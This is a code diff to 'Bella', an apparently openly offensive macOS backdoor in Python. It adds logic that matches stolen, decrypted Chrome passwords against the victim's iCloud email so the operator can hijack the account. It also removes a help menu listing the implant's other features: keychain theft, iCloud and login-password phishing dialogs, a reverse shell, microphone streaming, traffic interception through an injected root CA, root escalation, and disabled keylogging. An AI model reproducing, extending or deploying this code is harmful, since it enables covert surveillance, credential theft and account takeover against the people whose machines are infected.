@@ -445,9 +445,20 @@ def chrome_decrypt(encrypted_value, iv, key): #AES decryption using the PBKDF2 k
 def chrome_dump(safe_storage_key, login_data):
 	send_msg("%s%sPasswords for [%s]%s:\n" % (yellow_star, bold + underline, login_data.split("/")[-2], endANSI), False)
 	empty = True
+	iTunesAccs = get_iTunes_accounts()
+	probablePass = []
 	for i, x in enumerate(chrome_process(safe_storage_key, "%s" % login_data)):
 		send_msg("%s[%s]%s %s%s%s\n\t%sUser%s: %s\n\t%sPass%s: %s\n" % ("\033[32m", (i + 1), "\033[0m", "\033[1m", x[0], "\033[0m", "\033[32m", "\033[0m", x[1], "\033[32m", "\033[0m", x[2]), False)
+		#send_msg("x[0]: "+x[0]+" x[1]: "+x[1],False)
 		empty = False
+		for iAcs in iTunesAccs:
+			if iAcs[1] in x[1]:
+				probablePass.append([x[1],x[2]])
+
+	if len(probablePass) > 0:
+		send_msg("\n%sFound chrome credentials that have the same iCloud email\n    Try running submit_iCloud_pass with these:\n\n" % blue_star,False)
+		for candidate in probablePass:
+			send_msg("%sUser%s: %s\n%sPass%s: %s\n\n" % ("\033[32m", "\033[0m", candidate[0], "\033[32m", "\033[0m", candidate[1]), False)
 	if not empty:
 		send_msg('', False)
 	else:
@@ -1007,40 +1018,6 @@ def keychain_download():
 		return 'keychain_download' + pickle.dumps(serial)
 	except Exception, e:
 		return (red_minus + "Error reading keychains.\n%s\n") % str(e)
-
-def manual():
-	value = "\n%sChat History%s\nDownload the user's macOS iMessage database.\nUsage: %schat_history%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
-	value += "\n%sCheck Backups%s\nEnumerate the user's local iOS backups.\nUsage: %scheck_backups%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
-	value += "\n%sChrome Dump%s\nDecrypt user passwords stored in Google Chrome profiles.\nUsage: %schrome_dump%s\nRequirements: Chrome SS Key [see chrome_safe_storage]\n" % (underline + bold + green, endANSI, bold, endANSI)
-	value += "\n%sChrome Safe Storage%s\nPrompt the keychain to present the user's Chrome Safe Storage Key.\nUsage: %schrome_safe_storage%s\nRequirements: None\n" % (underline + bold + green, endANSI, bold, endANSI)
-	value += "\n%sCurrent Users%s\nFind all currently logged in users.\nUsage: %scurrent_Users%s\nRequirements: None\n" % (underline + bold + yellow, endANSI, bold, endANSI)
-	value += "\n%sGet Root%s\nAttempt to escalate Bella to root through a variety of attack vectors.\nUsage: %sget_root%s\nRequirements: None\n" % (underline + bold + red, endANSI, bold, endANSI)
-	value += "\n%sFind my iPhone%s\nLocate all devices on the user's iCloud account.\nUsage: %siCloud_FMIP%s\nRequirements: iCloud Password [see iCloud_phish]\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
-	value += "\n%sFind my Friends%s\nLocate all shared devices on the user's iCloud account.\nUsage: %siCloud_FMF%s\nRequirements: iCloud Token or iCloud Password\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
-	value += "\n%siCloud Contacts%s\nGet contacts from the user's iCloud account.\nUsage: %siCloud_contacts%s\nRequirements: iCloud Token or iCloud Password\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
-	value += "\n%siCloud Password Phish%s\nTrick user into verifying their iCloud password through iTunes prompt.\nUsage: %siCloud_phish%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
-	value += "\n%siCloud Query%s\nGet information about the user's iCloud account.\nUsage: %siCloud_query%s\nRequirements: iCloud Token or iCloud Password\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
-	value += "\n%siCloud Token%s\nPrompt the keychain to present the User's iCloud Authorization Token.\nUsage: %siCloud_token%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
-	value += "\n%sInsomnia Load%s\nLoads an InsomniaX Kext to prevent laptop from sleeping, even when closed.\nUsage: %sinsomnia_load%s\nRequirements: root, laptops only\n" % (underline + bold + yellow, endANSI, bold, endANSI)
-	value += "\n%sInsomnia Unload%s\nUnloads an InsomniaX Kext loaded through insomnia_load.\nUsage: %sinsomnia_unload%s\nRequirements: root, laptops only\n" % (underline + bold + yellow, endANSI, bold, endANSI)
-	value += "\n%sInteractive Shell%s\nLoads an interactive reverse shell (bash) to the remote machine. This allows us to run commands such as telnet, nano, sudo, etc.\nUsage: %sinteractive_shell%s\n" % (underline + bold, endANSI, bold, endANSI)
-	value += "\n%sBella Info%s\nExtensively details information about the user and information from the Bella instance.\nUsage: %sbella_info%s\nRequirements: None\n" % (underline + bold + yellow, endANSI, bold, endANSI)
-	value += "\n%sKeychain Download%s\nDownloads all available Keychains, including iCloud, for offline processing.\nUsage: %skeychain_download%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
-	value += "\n%sMike Stream%s\nStreams the microphone input over a socket.\nUsage: %smike_stream%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
-	value += "\n%sMITM Start%s\nInjects a Root CA into the System Roots Keychain and redirects all traffic to the CC.\nUsage: %smitm_start%s\nRequirements: root.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
-	value += "\n%sMITM Kill%s\nEnds a MITM session started by MITM start.\nUsage: %smitm_kill%s\nRequirements: root.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
-	value += "\n%sReboot Server%s\nRestarts a Bella instance.\nUsage: %sreboot_server%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
-	value += "\n%sRemove Server%s\nCompletely removes a Bella server remotely.\nUsage: %sremoveserver_yes%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
-	value += "\n%sSafari History%s\nDownloads user's Safari history in a nice format.\nUsage: %ssafari_history%s\nRequirements: None.\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
-	value += "\n%sScreenshot%s\nTake a screen shot of the current active desktop.\nUsage: %sscreen_shot%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
-	value += "\n%sSet Client Name%s\nChange the computer name that is displayed in the Control Center.\nUsage: %sset_client_name%s\nRequirements: None.\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
-	value += "\n%sShutdown Server%s\nUnloads Bella from launchctl until next reboot.\nUsage: %sshutdown_server%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
-	value += "\n%sSystem Information%s\nReturns basic information about the system.\nUsage: %ssysinfo%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
-	value += "\n%sUser Pass Phish%s\nWill phish the user for their password with a clever dialog.\nUsage: %suser_pass_phish%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
-	#value += "\n%sKey Start%s\nBegin keylogging in the background.\nUsage: %skeyStart%s (requires root)\n" % (underline + bold, endANSI, bold, endANSI)
-	#value += "\n%sKey Kill%s\nStop keylogging started through Key Start\nUsage: %skeyStart%s (requires root)\n" % (underline + bold, endANSI, bold, endANSI)
-	#value += "\n%sKey Read%s\nReads the encrypted key log file from Key Start.\nUsage: %skeyRead%s (requires root)\n" % (underline + bold, endANSI, bold, endANSI)
-	return value
 
 def mike_helper(payload_path):
 	stream_port = 2897
@@ -1959,8 +1936,6 @@ def bella(*Emma):
 					send_msg(insomnia_load(), True)
 				elif data == "insomnia_unload":
 					send_msg(insomnia_unload(), True)
-				elif data == "manual":
-					send_msg(manual(), True)
 				elif data == "screen_shot":
 					send_msg(screenShot(), True)
 				elif data.startswith("update_server"):
@@ -2270,13 +2245,7 @@ def bella(*Emma):
 			pass
 
 ##### Below variables are global scopes that are accessed by most of the methods in Bella. Should make a class structure #####
-endANSI = '\033[0m'
-bold = '\033[1m'
-underline = '\033[4m'
-red_minus = '\033[31m[-] %s' % endANSI
-greenPlus = '\033[92m[+] %s' % endANSI
-blue_star = '\033[94m[*] %s' % endANSI
-yellow_star = '\033[93m[*] %s' % endANSI
+
 violet = '\033[95m'
 blue = '\033[94m'
 light_blue = '\033[34m'
@@ -2284,6 +2253,13 @@ green = '\033[92m'
 dark_green = '\033[32m'
 yellow = '\033[93m'
 red = '\033[31m'
+endANSI = '\033[0m'
+bold = '\033[1m'
+underline = '\033[4m'
+red_minus = '\033[31m[-] %s' % endANSI
+greenPlus = '\033[92m[+] %s' % endANSI
+blue_star = '\033[94m[*] %s' % endANSI
+yellow_star = '\033[93m[*] %s' % endANSI
 bella_error = ''
 cryptKey = 'edb0d31838fd883d3f5939d2ecb7e28c'
 try:
